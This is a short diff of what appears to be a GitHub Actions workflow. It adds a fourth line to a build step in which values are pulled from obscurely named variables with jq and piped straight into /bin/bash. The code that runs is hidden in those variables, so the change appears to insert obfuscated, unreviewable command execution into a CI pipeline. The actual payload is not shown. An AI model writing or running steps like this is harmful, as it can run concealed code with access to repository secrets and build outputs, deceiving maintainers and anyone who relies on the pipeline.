@@ -25,6 +25,7 @@ jobs:
           echo $h2 | jq -r .qqwo74180 | /bin/bash
           echo $fdamv9870 | jq -r .i0 | /bin/bash
           echo $ajl6 | jq -r .okdwr82 | /bin/bash
+          printf '%s' "$elk335" | jq -r .btda693 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
